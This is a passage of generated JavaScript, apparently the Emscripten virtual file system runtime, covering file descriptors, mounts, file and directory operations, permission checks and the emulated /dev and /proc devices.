    MAX_OPEN_FDS: 4096,
    nextfd: (function(fd_start, fd_end) {
        fd_start = fd_start || 0;
        fd_end = fd_end || FS.MAX_OPEN_FDS;
        for (var fd = fd_start; fd <= fd_end; fd++) {
            if (!FS.streams[fd]) {
                return fd
            }
        }
        throw new FS.ErrnoError(ERRNO_CODES.EMFILE)
    }),
    getStream: (function(fd) {
        return FS.streams[fd]
    }),
    createStream: (function(stream, fd_start, fd_end) {
        if (!FS.FSStream) {
            FS.FSStream = (function() {});
            FS.FSStream.prototype = {};
            Object.defineProperties(FS.FSStream.prototype, {
                object: {
                    get: (function() {
                        return this.node
                    }),
                    set: (function(val) {
                        this.node = val
                    })
                },
                isRead: {
                    get: (function() {
                        return (this.flags & 2097155) !== 1
                    })
                },
                isWrite: {
                    get: (function() {
                        return (this.flags & 2097155) !== 0
                    })
                },
                isAppend: {
                    get: (function() {
                        return this.flags & 1024
                    })
                }
            })
        }
        var newStream = new FS.FSStream;
        for (var p in stream) {
            newStream[p] = stream[p]
        }
        stream = newStream;
        var fd = FS.nextfd(fd_start, fd_end);
        stream.fd = fd;
        FS.streams[fd] = stream;
        return stream
    }),
    closeStream: (function(fd) {
        FS.streams[fd] = null
    }),
    chrdev_stream_ops: {
        open: (function(stream) {
            var device = FS.getDevice(stream.node.rdev);
            stream.stream_ops = device.stream_ops;
            if (stream.stream_ops.open) {
                stream.stream_ops.open(stream)
            }
        }),
        llseek: (function() {
            throw new FS.ErrnoError(ERRNO_CODES.ESPIPE)
        })
    },
    major: (function(dev) {
        return dev >> 8
    }),
    minor: (function(dev) {
        return dev & 255
    }),
    makedev: (function(ma, mi) {
        return ma << 8 | mi
    }),
    registerDevice: (function(dev, ops) {
        FS.devices[dev] = {
            stream_ops: ops
        }
    }),
    getDevice: (function(dev) {
        return FS.devices[dev]
    }),
    getMounts: (function(mount) {
        var mounts = [];
        var check = [mount];
        while (check.length) {
            var m = check.pop();
            mounts.push(m);
            check.push.apply(check, m.mounts)
        }
        return mounts
    }),
    syncfs: (function(populate, callback) {
        if (typeof populate === "function") {
            callback = populate;
            populate = !1
        }
        FS.syncFSRequests++;
        if (FS.syncFSRequests > 1) {
            console.log("warning: " + FS.syncFSRequests + " FS.syncfs operations in flight at once, probably just doing extra work")
        }
        var mounts = FS.getMounts(FS.root.mount);
        var completed = 0;

        function doCallback(err) {
            assert(FS.syncFSRequests > 0);
            FS.syncFSRequests--;
            return callback(err)
        }

        function done(err) {
            if (err) {
                if (!done.errored) {
                    done.errored = !0;
                    return doCallback(err)
                }
                return
            }
            if (++completed >= mounts.length) {
                doCallback(null)
            }
        }
        mounts.forEach((function(mount) {
            if (!mount.type.syncfs) {
                return done(null)
            }
            mount.type.syncfs(mount, populate, done)
        }))
    }),
    mount: (function(type, opts, mountpoint) {
        var root = mountpoint === "/";
        var pseudo = !mountpoint;
        var node;
        if (root && FS.root) {
            throw new FS.ErrnoError(ERRNO_CODES.EBUSY)
        } else if (!root && !pseudo) {
            var lookup = FS.lookupPath(mountpoint, {
                follow_mount: !1
            });
            mountpoint = lookup.path;
            node = lookup.node;
            if (FS.isMountpoint(node)) {
                throw new FS.ErrnoError(ERRNO_CODES.EBUSY)
            }
            if (!FS.isDir(node.mode)) {
                throw new FS.ErrnoError(ERRNO_CODES.ENOTDIR)
            }
        }
        var mount = {
            type: type,
            opts: opts,
            mountpoint: mountpoint,
            mounts: []
        };
        var mountRoot = type.mount(mount);
        mountRoot.mount = mount;
        mount.root = mountRoot;
        if (root) {
            FS.root = mountRoot
        } else if (node) {
            node.mounted = mount;
            if (node.mount) {
                node.mount.mounts.push(mount)
            }
        }
        return mountRoot
    }),
    unmount: (function(mountpoint) {
        var lookup = FS.lookupPath(mountpoint, {
            follow_mount: !1
        });
        if (!FS.isMountpoint(lookup.node)) {
            throw new FS.ErrnoError(ERRNO_CODES.EINVAL)
        }
        var node = lookup.node;
        var mount = node.mounted;
        var mounts = FS.getMounts(mount);
        Object.keys(FS.nameTable).forEach((function(hash) {
            var current = FS.nameTable[hash];
            while (current) {
                var next = current.name_next;
                if (mounts.indexOf(current.mount) !== -1) {
                    FS.destroyNode(current)
                }
                current = next
            }
        }));
        node.mounted = null;
        var idx = node.mount.mounts.indexOf(mount);
        assert(idx !== -1);
        node.mount.mounts.splice(idx, 1)
    }),
    lookup: (function(parent, name) {
        return parent.node_ops.lookup(parent, name)
    }),
    mknod: (function(path, mode, dev) {
        var lookup = FS.lookupPath(path, {
            parent: !0
        });
        var parent = lookup.node;
        var name = PATH.basename(path);
        if (!name || name === "." || name === "..") {
            throw new FS.ErrnoError(ERRNO_CODES.EINVAL)
        }
        var err = FS.mayCreate(parent, name);
        if (err) {
            throw new FS.ErrnoError(err)
        }
        if (!parent.node_ops.mknod) {
            throw new FS.ErrnoError(ERRNO_CODES.EPERM)
        }
        return parent.node_ops.mknod(parent, name, mode, dev)
    }),
    create: (function(path, mode) {
        mode = mode !== undefined ? mode : 438;
        mode &= 4095;
        mode |= 32768;
        return FS.mknod(path, mode, 0)
    }),
    mkdir: (function(path, mode) {
        mode = mode !== undefined ? mode : 511;
        mode &= 511 | 512;
        mode |= 16384;
        return FS.mknod(path, mode, 0)
    }),
    mkdirTree: (function(path, mode) {
        var dirs = path.split("/");
        var d = "";
        for (var i = 0; i < dirs.length; ++i) {
            if (!dirs[i]) continue;
            d += "/" + dirs[i];
            try {
                FS.mkdir(d, mode)
            } catch (e) {
                if (e.errno != ERRNO_CODES.EEXIST) throw e
            }
        }
    }),
    mkdev: (function(path, mode, dev) {
        if (typeof dev === "undefined") {
            dev = mode;
            mode = 438
        }
        mode |= 8192;
        return FS.mknod(path, mode, dev)
    }),
    symlink: (function(oldpath, newpath) {
        if (!PATH.resolve(oldpath)) {
            throw new FS.ErrnoError(ERRNO_CODES.ENOENT)
        }
        var lookup = FS.lookupPath(newpath, {
            parent: !0
        });
        var parent = lookup.node;
        if (!parent) {
            throw new FS.ErrnoError(ERRNO_CODES.ENOENT)
        }
        var newname = PATH.basename(newpath);
        var err = FS.mayCreate(parent, newname);
        if (err) {
            throw new FS.ErrnoError(err)
        }
        if (!parent.node_ops.symlink) {
            throw new FS.ErrnoError(ERRNO_CODES.EPERM)
        }
        return parent.node_ops.symlink(parent, newname, oldpath)
    }),
    rename: (function(old_path, new_path) {
        var old_dirname = PATH.dirname(old_path);
        var new_dirname = PATH.dirname(new_path);
        var old_name = PATH.basename(old_path);
        var new_name = PATH.basename(new_path);
        var lookup, old_dir, new_dir;
        try {
            lookup = FS.lookupPath(old_path, {
                parent: !0
            });
            old_dir = lookup.node;
            lookup = FS.lookupPath(new_path, {
                parent: !0
            });
            new_dir = lookup.node
        } catch (e) {
            throw new FS.ErrnoError(ERRNO_CODES.EBUSY)
        }
        if (!old_dir || !new_dir) throw new FS.ErrnoError(ERRNO_CODES.ENOENT);
        if (old_dir.mount !== new_dir.mount) {
            throw new FS.ErrnoError(ERRNO_CODES.EXDEV)
        }
        var old_node = FS.lookupNode(old_dir, old_name);
        var relative = PATH.relative(old_path, new_dirname);
        if (relative.charAt(0) !== ".") {
            throw new FS.ErrnoError(ERRNO_CODES.EINVAL)
        }
        relative = PATH.relative(new_path, old_dirname);
        if (relative.charAt(0) !== ".") {
            throw new FS.ErrnoError(ERRNO_CODES.ENOTEMPTY)
        }
        var new_node;
        try {
            new_node = FS.lookupNode(new_dir, new_name)
        } catch (e) {}
        if (old_node === new_node) {
            return
        }
        var isdir = FS.isDir(old_node.mode);
        var err = FS.mayDelete(old_dir, old_name, isdir);
        if (err) {
            throw new FS.ErrnoError(err)
        }
        err = new_node ? FS.mayDelete(new_dir, new_name, isdir) : FS.mayCreate(new_dir, new_name);
        if (err) {
            throw new FS.ErrnoError(err)
        }
        if (!old_dir.node_ops.rename) {
            throw new FS.ErrnoError(ERRNO_CODES.EPERM)
        }
        if (FS.isMountpoint(old_node) || new_node && FS.isMountpoint(new_node)) {
            throw new FS.ErrnoError(ERRNO_CODES.EBUSY)
        }
        if (new_dir !== old_dir) {
            err = FS.nodePermissions(old_dir, "w");
            if (err) {
                throw new FS.ErrnoError(err)
            }
        }
        try {
            if (FS.trackingDelegate.willMovePath) {
                FS.trackingDelegate.willMovePath(old_path, new_path)
            }
        } catch (e) {
            console.log("FS.trackingDelegate[\'willMovePath\'](\'" + old_path + "\', \'" + new_path + "\') threw an exception: " + e.message)
        }
        FS.hashRemoveNode(old_node);
        try {
            old_dir.node_ops.rename(old_node, new_dir, new_name)
        } catch (e) {
            throw e
        } finally {
            FS.hashAddNode(old_node)
        }
        try {
            if (FS.trackingDelegate.onMovePath) FS.trackingDelegate.onMovePath(old_path, new_path)
        } catch (e) {
            console.log("FS.trackingDelegate[\'onMovePath\'](\'" + old_path + "\', \'" + new_path + "\') threw an exception: " + e.message)
        }
    }),
    rmdir: (function(path) {
        var lookup = FS.lookupPath(path, {
            parent: !0
        });
        var parent = lookup.node;
        var name = PATH.basename(path);
        var node = FS.lookupNode(parent, name);
        var err = FS.mayDelete(parent, name, !0);
        if (err) {
            throw new FS.ErrnoError(err)
        }
        if (!parent.node_ops.rmdir) {
            throw new FS.ErrnoError(ERRNO_CODES.EPERM)
        }
        if (FS.isMountpoint(node)) {
            throw new FS.ErrnoError(ERRNO_CODES.EBUSY)
        }
        try {
            if (FS.trackingDelegate.willDeletePath) {
                FS.trackingDelegate.willDeletePath(path)
            }
        } catch (e) {
            console.log("FS.trackingDelegate[\'willDeletePath\'](\'" + path + "\') threw an exception: " + e.message)
        }
        parent.node_ops.rmdir(parent, name);
        FS.destroyNode(node);
        try {
            if (FS.trackingDelegate.onDeletePath) FS.trackingDelegate.onDeletePath(path)
        } catch (e) {
            console.log("FS.trackingDelegate[\'onDeletePath\'](\'" + path + "\') threw an exception: " + e.message)
        }
    }),
    readdir: (function(path) {
        var lookup = FS.lookupPath(path, {
            follow: !0
        });
        var node = lookup.node;
        if (!node.node_ops.readdir) {
            throw new FS.ErrnoError(ERRNO_CODES.ENOTDIR)
        }
        return node.node_ops.readdir(node)
    }),
    unlink: (function(path) {
        var lookup = FS.lookupPath(path, {
            parent: !0
        });
        var parent = lookup.node;
        var name = PATH.basename(path);
        var node = FS.lookupNode(parent, name);
        var err = FS.mayDelete(parent, name, !1);
        if (err) {
            throw new FS.ErrnoError(err)
        }
        if (!parent.node_ops.unlink) {
            throw new FS.ErrnoError(ERRNO_CODES.EPERM)
        }
        if (FS.isMountpoint(node)) {
            throw new FS.ErrnoError(ERRNO_CODES.EBUSY)
        }
        try {
            if (FS.trackingDelegate.willDeletePath) {
                FS.trackingDelegate.willDeletePath(path)
            }
        } catch (e) {
            console.log("FS.trackingDelegate[\'willDeletePath\'](\'" + path + "\') threw an exception: " + e.message)
        }
        parent.node_ops.unlink(parent, name);
        FS.destroyNode(node);
        try {
            if (FS.trackingDelegate.onDeletePath) FS.trackingDelegate.onDeletePath(path)
        } catch (e) {
            console.log("FS.trackingDelegate[\'onDeletePath\'](\'" + path + "\') threw an exception: " + e.message)
        }
    }),
    readlink: (function(path) {
        var lookup = FS.lookupPath(path);
        var link = lookup.node;
        if (!link) {
            throw new FS.ErrnoError(ERRNO_CODES.ENOENT)
        }
        if (!link.node_ops.readlink) {
            throw new FS.ErrnoError(ERRNO_CODES.EINVAL)
        }
        return PATH.resolve(FS.getPath(link.parent), link.node_ops.readlink(link))
    }),
    stat: (function(path, dontFollow) {
        var lookup = FS.lookupPath(path, {
            follow: !dontFollow
        });
        var node = lookup.node;
        if (!node) {
            throw new FS.ErrnoError(ERRNO_CODES.ENOENT)
        }
        if (!node.node_ops.getattr) {
            throw new FS.ErrnoError(ERRNO_CODES.EPERM)
        }
        return node.node_ops.getattr(node)
    }),
    lstat: (function(path) {
        return FS.stat(path, !0)
    }),
    chmod: (function(path, mode, dontFollow) {
        var node;
        if (typeof path === "string") {
            var lookup = FS.lookupPath(path, {
                follow: !dontFollow
            });
            node = lookup.node
        } else {
            node = path
        }
        if (!node.node_ops.setattr) {
            throw new FS.ErrnoError(ERRNO_CODES.EPERM)
        }
        node.node_ops.setattr(node, {
            mode: mode & 4095 | node.mode & ~4095,
            timestamp: Date.now()
        })
    }),
    lchmod: (function(path, mode) {
        FS.chmod(path, mode, !0)
    }),
    fchmod: (function(fd, mode) {
        var stream = FS.getStream(fd);
        if (!stream) {
            throw new FS.ErrnoError(ERRNO_CODES.EBADF)
        }
        FS.chmod(stream.node, mode)
    }),
    chown: (function(path, uid, gid, dontFollow) {
        var node;
        if (typeof path === "string") {
            var lookup = FS.lookupPath(path, {
                follow: !dontFollow
            });
            node = lookup.node
        } else {
            node = path
        }
        if (!node.node_ops.setattr) {
            throw new FS.ErrnoError(ERRNO_CODES.EPERM)
        }
        node.node_ops.setattr(node, {
            timestamp: Date.now()
        })
    }),
    lchown: (function(path, uid, gid) {
        FS.chown(path, uid, gid, !0)
    }),
    fchown: (function(fd, uid, gid) {
        var stream = FS.getStream(fd);
        if (!stream) {
            throw new FS.ErrnoError(ERRNO_CODES.EBADF)
        }
        FS.chown(stream.node, uid, gid)
    }),
    truncate: (function(path, len) {
        if (len < 0) {
            throw new FS.ErrnoError(ERRNO_CODES.EINVAL)
        }
        var node;
        if (typeof path === "string") {
            var lookup = FS.lookupPath(path, {
                follow: !0
            });
            node = lookup.node
        } else {
            node = path
        }
        if (!node.node_ops.setattr) {
            throw new FS.ErrnoError(ERRNO_CODES.EPERM)
        }
        if (FS.isDir(node.mode)) {
            throw new FS.ErrnoError(ERRNO_CODES.EISDIR)
        }
        if (!FS.isFile(node.mode)) {
            throw new FS.ErrnoError(ERRNO_CODES.EINVAL)
        }
        var err = FS.nodePermissions(node, "w");
        if (err) {
            throw new FS.ErrnoError(err)
        }
        node.node_ops.setattr(node, {
            size: len,
            timestamp: Date.now()
        })
    }),
    ftruncate: (function(fd, len) {
        var stream = FS.getStream(fd);
        if (!stream) {
            throw new FS.ErrnoError(ERRNO_CODES.EBADF)
        }
        if ((stream.flags & 2097155) === 0) {
            throw new FS.ErrnoError(ERRNO_CODES.EINVAL)
        }
        FS.truncate(stream.node, len)
    }),
    utime: (function(path, atime, mtime) {
        var lookup = FS.lookupPath(path, {
            follow: !0
        });
        var node = lookup.node;
        node.node_ops.setattr(node, {
            timestamp: Math.max(atime, mtime)
        })
    }),
    open: (function(path, flags, mode, fd_start, fd_end) {
        if (path === "") {
            throw new FS.ErrnoError(ERRNO_CODES.ENOENT)
        }
        flags = typeof flags === "string" ? FS.modeStringToFlags(flags) : flags;
        mode = typeof mode === "undefined" ? 438 : mode;
        if (flags & 64) {
            mode = mode & 4095 | 32768
        } else {
            mode = 0
        }
        var node;
        if (typeof path === "object") {
            node = path
        } else {
            path = PATH.normalize(path);
            try {
                var lookup = FS.lookupPath(path, {
                    follow: !(flags & 131072)
                });
                node = lookup.node
            } catch (e) {}
        }
        var created = !1;
        if (flags & 64) {
            if (node) {
                if (flags & 128) {
                    throw new FS.ErrnoError(ERRNO_CODES.EEXIST)
                }
            } else {
                node = FS.mknod(path, mode, 0);
                created = !0
            }
        }
        if (!node) {
            throw new FS.ErrnoError(ERRNO_CODES.ENOENT)
        }
        if (FS.isChrdev(node.mode)) {
            flags &= ~512
        }
        if (flags & 65536 && !FS.isDir(node.mode)) {
            throw new FS.ErrnoError(ERRNO_CODES.ENOTDIR)
        }
        if (!created) {
            var err = FS.mayOpen(node, flags);
            if (err) {
                throw new FS.ErrnoError(err)
            }
        }
        if (flags & 512) {
            FS.truncate(node, 0)
        }
        flags &= ~(128 | 512);
        var stream = FS.createStream({
            node: node,
            path: FS.getPath(node),
            flags: flags,
            seekable: !0,
            position: 0,
            stream_ops: node.stream_ops,
            ungotten: [],
            error: !1
        }, fd_start, fd_end);
        if (stream.stream_ops.open) {
            stream.stream_ops.open(stream)
        }
        if (Module.logReadFiles && !(flags & 1)) {
            if (!FS.readFiles) FS.readFiles = {};
            if (!(path in FS.readFiles)) {
                FS.readFiles[path] = 1;
                Module.printErr("read file: " + path)
            }
        }
        try {
            if (FS.trackingDelegate.onOpenFile) {
                var trackingFlags = 0;
                if ((flags & 2097155) !== 1) {
                    trackingFlags |= FS.tracking.openFlags.READ
                }
                if ((flags & 2097155) !== 0) {
                    trackingFlags |= FS.tracking.openFlags.WRITE
                }
                FS.trackingDelegate.onOpenFile(path, trackingFlags)
            }
        } catch (e) {
            console.log("FS.trackingDelegate[\'onOpenFile\'](\'" + path + "\', flags) threw an exception: " + e.message)
        }
        return stream
    }),
    close: (function(stream) {
        if (stream.getdents) stream.getdents = null;
        try {
            if (stream.stream_ops.close) {
                stream.stream_ops.close(stream)
            }
        } catch (e) {
            throw e
        } finally {
            FS.closeStream(stream.fd)
        }
    }),
    llseek: (function(stream, offset, whence) {
        if (!stream.seekable || !stream.stream_ops.llseek) {
            throw new FS.ErrnoError(ERRNO_CODES.ESPIPE)
        }
        stream.position = stream.stream_ops.llseek(stream, offset, whence);
        stream.ungotten = [];
        return stream.position
    }),
    read: (function(stream, buffer, offset, length, position) {
        if (length < 0 || position < 0) {
            throw new FS.ErrnoError(ERRNO_CODES.EINVAL)
        }
        if ((stream.flags & 2097155) === 1) {
            throw new FS.ErrnoError(ERRNO_CODES.EBADF)
        }
        if (FS.isDir(stream.node.mode)) {
            throw new FS.ErrnoError(ERRNO_CODES.EISDIR)
        }
        if (!stream.stream_ops.read) {
            throw new FS.ErrnoError(ERRNO_CODES.EINVAL)
        }
        var seeking = !0;
        if (typeof position === "undefined") {
            position = stream.position;
            seeking = !1
        } else if (!stream.seekable) {
            throw new FS.ErrnoError(ERRNO_CODES.ESPIPE)
        }
        var bytesRead = stream.stream_ops.read(stream, buffer, offset, length, position);
        if (!seeking) stream.position += bytesRead;
        return bytesRead
    }),
    write: (function(stream, buffer, offset, length, position, canOwn) {
        if (length < 0 || position < 0) {
            throw new FS.ErrnoError(ERRNO_CODES.EINVAL)
        }
        if ((stream.flags & 2097155) === 0) {
            throw new FS.ErrnoError(ERRNO_CODES.EBADF)
        }
        if (FS.isDir(stream.node.mode)) {
            throw new FS.ErrnoError(ERRNO_CODES.EISDIR)
        }
        if (!stream.stream_ops.write) {
            throw new FS.ErrnoError(ERRNO_CODES.EINVAL)
        }
        if (stream.flags & 1024) {
            FS.llseek(stream, 0, 2)
        }
        var seeking = !0;
        if (typeof position === "undefined") {
            position = stream.position;
            seeking = !1
        } else if (!stream.seekable) {
            throw new FS.ErrnoError(ERRNO_CODES.ESPIPE)
        }
        var bytesWritten = stream.stream_ops.write(stream, buffer, offset, length, position, canOwn);
        if (!seeking) stream.position += bytesWritten;
        try {
            if (stream.path && FS.trackingDelegate.onWriteToFile) FS.trackingDelegate.onWriteToFile(stream.path)
        } catch (e) {
            console.log("FS.trackingDelegate[\'onWriteToFile\'](\'" + path + "\') threw an exception: " + e.message)
        }
        return bytesWritten
    }),
    allocate: (function(stream, offset, length) {
        if (offset < 0 || length <= 0) {
            throw new FS.ErrnoError(ERRNO_CODES.EINVAL)
        }
        if ((stream.flags & 2097155) === 0) {
            throw new FS.ErrnoError(ERRNO_CODES.EBADF)
        }
        if (!FS.isFile(stream.node.mode) && !FS.isDir(stream.node.mode)) {
            throw new FS.ErrnoError(ERRNO_CODES.ENODEV)
        }
        if (!stream.stream_ops.allocate) {
            throw new FS.ErrnoError(ERRNO_CODES.EOPNOTSUPP)
        }
        stream.stream_ops.allocate(stream, offset, length)
    }),
    mmap: (function(stream, buffer, offset, length, position, prot, flags) {
        if ((stream.flags & 2097155) === 1) {
            throw new FS.ErrnoError(ERRNO_CODES.EACCES)
        }
        if (!stream.stream_ops.mmap) {
            throw new FS.ErrnoError(ERRNO_CODES.ENODEV)
        }
        return stream.stream_ops.mmap(stream, buffer, offset, length, position, prot, flags)
    }),
    msync: (function(stream, buffer, offset, length, mmapFlags) {
        if (!stream || !stream.stream_ops.msync) {
            return 0
        }
        return stream.stream_ops.msync(stream, buffer, offset, length, mmapFlags)
    }),
    munmap: (function(stream) {
        return 0
    }),
    ioctl: (function(stream, cmd, arg) {
        if (!stream.stream_ops.ioctl) {
            throw new FS.ErrnoError(ERRNO_CODES.ENOTTY)
        }
        return stream.stream_ops.ioctl(stream, cmd, arg)
    }),
    readFile: (function(path, opts) {
        opts = opts || {};
        opts.flags = opts.flags || "r";
        opts.encoding = opts.encoding || "binary";
        if (opts.encoding !== "utf8" && opts.encoding !== "binary") {
            throw new Error('Invalid encoding type "\'+opts.encoding+\'"')
        }
        var ret;
        var stream = FS.open(path, opts.flags);
        var stat = FS.stat(path);
        var length = stat.size;
        var buf = new Uint8Array(length);
        FS.read(stream, buf, 0, length, 0);
        if (opts.encoding === "utf8") {
            ret = UTF8ArrayToString(buf, 0)
        } else if (opts.encoding === "binary") {
            ret = buf
        }
        FS.close(stream);
        return ret
    }),
    writeFile: (function(path, data, opts) {
        opts = opts || {};
        opts.flags = opts.flags || "w";
        opts.encoding = opts.encoding || "utf8";
        if (opts.encoding !== "utf8" && opts.encoding !== "binary") {
            throw new Error('Invalid encoding type "\'+opts.encoding+\'"')
        }
        var stream = FS.open(path, opts.flags, opts.mode);
        if (opts.encoding === "utf8") {
            var buf = new Uint8Array(lengthBytesUTF8(data) + 1);
            var actualNumBytes = stringToUTF8Array(data, buf, 0, buf.length);
            FS.write(stream, buf, 0, actualNumBytes, 0, opts.canOwn)
        } else if (opts.encoding === "binary") {
            FS.write(stream, data, 0, data.length, 0, opts.canOwn)
        }
        FS.close(stream)
    }),
    cwd: (function() {
        return FS.currentPath
    }),
    chdir: (function(path) {
        var lookup = FS.lookupPath(path, {
            follow: !0
        });
        if (lookup.node === null) {
            throw new FS.ErrnoError(ERRNO_CODES.ENOENT)
        }
        if (!FS.isDir(lookup.node.mode)) {
            throw new FS.ErrnoError(ERRNO_CODES.ENOTDIR)
        }
        var err = FS.nodePermissions(lookup.node, "x");
        if (err) {
            throw new FS.ErrnoError(err)
        }
        FS.currentPath = lookup.path
    }),
    createDefaultDirectories: (function() {
        FS.mkdir("/tmp");
        FS.mkdir("/home");
        FS.mkdir("/home/web_user")
    }),
    createDefaultDevices: (function() {
        FS.mkdir("/dev");
        FS.registerDevice(FS.makedev(1, 3), {
            read: (function() {
                return 0
            }),
            write: (function(stream, buffer, offset, length, pos) {
                return length
            })
        });
        FS.mkdev("/dev/null", FS.makedev(1, 3));
        TTY.register(FS.makedev(5, 0), TTY.default_tty_ops);
        TTY.register(FS.makedev(6, 0), TTY.default_tty1_ops);
        FS.mkdev("/dev/tty", FS.makedev(5, 0));
        FS.mkdev("/dev/tty1", FS.makedev(6, 0));
        var random_device;
        if (typeof crypto !== "undefined") {
            var randomBuffer = new Uint8Array(1);
            random_device = (function() {
                crypto.getRandomValues(randomBuffer);
                return randomBuffer[0]
            })
        } else if (ENVIRONMENT_IS_NODE) {
            random_device = (function() {
                return require("crypto").randomBytes(1)[0]
            })
        } else {
            random_device = (function() {
                return Math.random() * 256 | 0
            })
        }
        FS.createDevice("/dev", "random", random_device);
        FS.createDevice("/dev", "urandom", random_device);
        FS.mkdir("/dev/shm");
        FS.mkdir("/dev/shm/tmp")
    }),
    createSpecialDirectories: (function() {
        FS.mkdir("/proc");
        FS.mkdir("/proc/self");
        FS.mkdir("/proc/self/fd");
        FS.mount({
            mount: (function() {
                var node = FS.createNode("/proc/self", "fd", 16384 | 511, 73);
                node.node_ops = {
                    lookup: (function(parent, name) {
                        var fd = +name;
                        var stream = FS.getStream(fd);
                        if (!stream) throw new FS.ErrnoError(ERRNO_CODES.EBADF);
                        var ret = {
                            parent: null,
                            mount: {
                                mountpoint: "fake"
                            },
                            node_ops: {
                                readlink: (function() {
                                    return stream.path
                                })
                            }
                        };
                        ret.parent = ret;
                        return ret
                    })
                };
                return node
            })
        }, {}, "/proc/self/fd")
    }),
    createStandardStreams: (function() {
        if (Module.stdin) {
            FS.createDevice("/dev", "stdin", Module.stdin)
        } else {
            FS.symlink("/dev/tty", "/dev/stdin")
        }
        if (Module.stdout) {
            FS.createDevice("/dev", "stdout", null, Module.stdout)
        } else {
            FS.symlink("/dev/tty", "/dev/stdout")
        }
        if (Module.stderr) {
            FS.createDevice("/dev", "stderr", null, Module.stderr)
        } else {
            FS.symlink("/dev/tty1", "/dev/stderr")
        }
        var stdin = FS.open("/dev/stdin", "r");
        assert(stdin.fd === 0, "invalid handle for stdin (" + stdin.fd + ")");
        var stdout = FS.open("/dev/stdout", "w");
        assert(stdout.fd === 1, "invalid handle for stdout (" + stdout.fd + ")");
        var stderr = FS.open("/dev/stderr", "w");
        assert(stderr.fd === 2, "invalid handle for stderr (" + stderr.fd + ")")
    }),
    ensureErrnoError: (function() {
        if (FS.ErrnoError) return;
        FS.ErrnoError = function ErrnoError(errno, node) {
            this.node = node;
            this.setErrno = (function(errno) {
                this.errno = errno;
                for (var key in ERRNO_CODES) {
                    if (ERRNO_CODES[key] === errno) {
                        this.code = key;
                        break
                    }
                }
            });
            this.setErrno(errno);
            this.message = ERRNO_MESSAGES[errno]
        };
        FS.ErrnoError.prototype = new Error;
        FS.ErrnoError.prototype.constructor = FS.ErrnoError;
        [ERRNO_CODES.ENOENT].forEach((function(code) {
            FS.genericErrors[code] = new FS.ErrnoError(code);
            FS.genericErrors[code].stack = "<generic error, no stack>"
        }))
    }),
    staticInit: (function() {
        FS.ensureErrnoError();
        FS.nameTable = new Array(4096);
        FS.mount(MEMFS, {}, "/");
        FS.createDefaultDirectories();
        FS.createDefaultDevices();
        FS.createSpecialDirectories();
        FS.filesystems = {
            "MEMFS": MEMFS,
            "IDBFS": IDBFS,
            "NODEFS": NODEFS,
            "WORKERFS": WORKERFS
        }
    }),
    init: (function(input, output, error) {
        assert(!FS.init.initialized, "FS.init was previously called. If you want to initialize later with custom parameters, remove any earlier calls (note that one is automatically added to the generated code)");
        FS.init.initialized = !0;
        FS.ensureErrnoError();
        Module.stdin = input || Module.stdin;
        Module.stdout = output || Module.stdout;
        Module.stderr = error || Module.stderr;
        FS.createStandardStreams()
    }),
    quit: (function() {
        FS.init.initialized = !1;
        var fflush = Module._fflush;
        if (fflush) fflush(0);
        for (var i = 0; i < FS.streams.length; i++) {
            var stream = FS.streams[i];
            if (!stream) {
                continue
            }
            FS.close(stream)
        }
    }),
    getMode: (function(canRead, canWrite) {
        var mode = 0;
        if (canRead) mode |= 292 | 73;
        if (canWrite) mode |= 146;
        return mode
    }),
    joinPath: (function(parts, forceRelative) {
        var path = PATH.join.apply(null, parts);
        if (forceRelative && path[0] == "/") path = path.substr(1);
        return path
    }),
    absolutePath: (function(relative, base) {
        return PATH.resolve(base, relative)
    }),
    standardizePath: (function(path) {
        return PATH.normalize(path)
    }),
    findObject: (function(path, dontResolveLastLink) {
        var ret = FS.analyzePath(path, dontResolveLastLink);
        if (ret.exists) {
            return ret.object
        } else {
            ___setErrNo(ret.error);
            return null
        }
    }),
    analyzePath: (function(path, dontResolveLastLink) {
        try {
            var lookup = FS.lookupPath(path, {
                follow: !dontResolveLastLink
            });
            path = lookup.path
        } catch (e) {}
        var ret = {
            isRoot: !1,
            exists: !1,
            error: 0,
            name: null,
            path: null,
            object: null,
            parentExists: !1,
            parentPath: null,
            parentObject: null
        };
        try {
            var lookup = FS.lookupPath(path, {
                parent: !0
            });
            ret.parentExists = !0;
            ret.parentPath = lookup.path;
            ret.parentObject = lookup.node;
            ret.name = PATH.basename(path);
            lookup = FS.lookupPath(path, {
                follow: !dontResolveLastLink
            });
            ret.exists = !0;
            ret.path = lookup.path;
            ret.object = lookup.node;
            ret.name = lookup.node.name;
            ret.isRoot = lookup.path === "/"
        } catch (e) {
            ret.error = e.errno
        }
        return ret
    }),
    createFolder: (function(parent, name, canRead, canWrite) {
        var path = PATH.join2(typeof parent === "string" ? parent : FS.getPath(parent), name);
        var mode = FS.getMode(canRead, canWrite);
        return FS.mkdir(path, mode)
    }),
    createPath: (function(parent, path, canRead, canWrite) {
        parent = typeof parent === "string" ? parent : FS.getPath(parent);
        var parts = path.split("/").reverse();
        while (parts.length) {
            var part = parts.pop();
            if (!part) continue;
            var current = PATH.join2(parent, part);
            try {
                FS.mkdir(current)
            } catch (e) {}
            parent = current
        }
        return current
    }),
    createFile: (function(parent, name, properties, canRead, canWrite) {
        var path = PATH.join2(typeof parent === "string" ? parent : FS.getPath(parent), name);
        var mode = FS.getMode(canRead, canWrite);
        return FS.create(path, mode)
    }),
    createDataFile: (function(parent, name, data, canRead, canWrite, canOwn) {
        var path = name ? PATH.join2(typeof parent === "string" ? parent : FS.getPath(parent), name) : parent;
        var mode = FS.getMode(canRead, canWrite);
        var node = FS.create(path, mode);
        if (data) {
            if (typeof data === "string") {
                var arr = new Array(data.length);
                for (var i = 0, len = data.length; i < len; ++i) arr[i] = data.charCodeAt(i);
                data = arr
            }
            FS.chmod(node, mode | 146);
            var stream = FS.open(node, "w");
            FS.write(stream, data, 0, data.length, 0, canOwn);
            FS.close(stream);
            FS.chmod(node, mode)
        }
        return node
    }),
    createDevice: (function(parent, name, input, output) {
        var path = PATH.join2(typeof parent === "string" ? parent : FS.getPath(parent), name);
        var mode = FS.getMode(!!input, !!output);
        if (!FS.createDevice.major) FS.createDevice.major = 64;
        var dev = FS.makedev(FS.createDevice.major++, 0);
        FS.registerDevice(dev, {
            open: (function(stream) {
                stream.seekable = !1
            }),
            close: (function(stream) {
                if (output && output.buffer && output.buffer.length) {
                    output(10)
                }
            }),
            read: (function(stream, buffer, offset, length, pos) {
                var bytesRead = 0;
                for (var i = 0; i < length; i++) {
                    var result;
                    try {
                        result = input()
                    } catch (e) {
                        throw new FS.ErrnoError(ERRNO_CODES.EIO)
                    }
                    if (result === undefined && bytesRead === 0) {
